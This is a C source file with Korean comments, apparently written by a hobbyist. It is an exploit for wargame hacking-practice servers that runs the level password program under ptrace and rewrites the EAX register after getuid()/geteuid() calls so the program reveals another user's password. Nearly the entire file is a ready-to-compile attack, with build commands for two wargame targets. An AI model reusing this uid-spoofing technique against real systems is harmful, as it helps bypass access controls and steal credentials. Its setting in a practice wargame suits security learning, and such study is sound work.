/* 
* Wargames level password exploit.
*
*     <? $eMail = "indra"."\x40"."linux.co.kr"; ?>
*
*                    http://indra.linuxstudy.pe.kr
*
* - 사족
* 재미로 만들었음..-_-;
*
* - 원리
* 원리는 간단하다..
* wargame 에는 자신이 속해있는 level 의 password 를 보여주는 
* 명령어가 존재한다..
* 이런 명령이 대부분 getuid(), geteuid() 계통의 함수를 사용하여,
* 명령을 실행하는 사용자의 uid 를 검색하게 되는데,
* 이러한 함수들은 검색된 uid 를 리턴값으로 보내게 되고, 기본적으로
* 리턴값은 eax 레지스터를 사용하게 된다.
* 이러한 이유로 eax 레지스터의 값과 자신의 uid 를 검사하여,
* getuid(), geteuid() 와 같은 함수가 사용되는지 점검할수 있다.
* 그리고 그 uid 를 자신이 원하는 uid 로 바꾸는것이다.
*
* - 컴파일
* 컴파일은 다음과 같은 방법으로 한다.
* hackerschool : gcc -o ex ex.c -DHACKERSCHOOL
* hackerslab : gcc -o ex ex.c -DHACKERSLAB
*/
#include <stdio.h>
#include <unistd.h>
#include <pwd.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <linux/ptrace.h>

#ifdef  HACKERSCHOOL
    #define TARGET  "/bin/my-pass"
#endif
#ifdef  HACKERSLAB
    #define TARGET  "/bin/pass"
#endif

int main(void)
{
    int     pid,            // 프로세스 아이디
            status,         // 프로세스 상태
            uid;            // 변경할 uid

    char    user[32];       // 사용자 이름
    struct  passwd  *pw;    // passwd 구조체
    struct  pt_regs regs;   // pt_regs 구조체

    memset(user, 0, sizeof(user));

    printf("UserName: ");

    fgets(user, sizeof(user), stdin);
    user[strlen(user) - 1] = '\0';

    if((pw = getpwnam(user)) == NULL) {
        printf("getpwnam() error.\n");
        exit(-1);
    }

    uid = pw->pw_uid;

    pid = fork();   // 새로운 프로세스 생성

    // 자식 프로세스
    if(pid == 0) {
        ptrace(PTRACE_TRACEME, 0, 1, 0);
        execl(TARGET, TARGET, 0);
        exit(0);
    }

    // 부모 프로세스
    while(1) {
        wait(&status);
        if(WIFEXITED(status)) exit(0);

        // 자식 프로세스의 user 영역에서 eax 레지스터값을 가져옴
        regs.eax = ptrace(PTRACE_PEEKUSR, pid, 4*EAX, 0);

        // 만일 eax 의 레지스터값이 자신의 uid 와 같을때
        // 원하는 uid 로 값을 바꾼다.
        // 이는 getuid(), geteuid() 등의 함수가 값을 리턴함에 있어
        // eax 레지스터를 사용하므로, 이를 판단하고 다른값을 적용할수 있음이다.
        if(regs.eax == getuid()) {
            ptrace(PTRACE_POKEUSR, pid, 4*EAX, uid);
        }

        ptrace(PTRACE_SYSCALL, pid, 1, 0);
    }
}
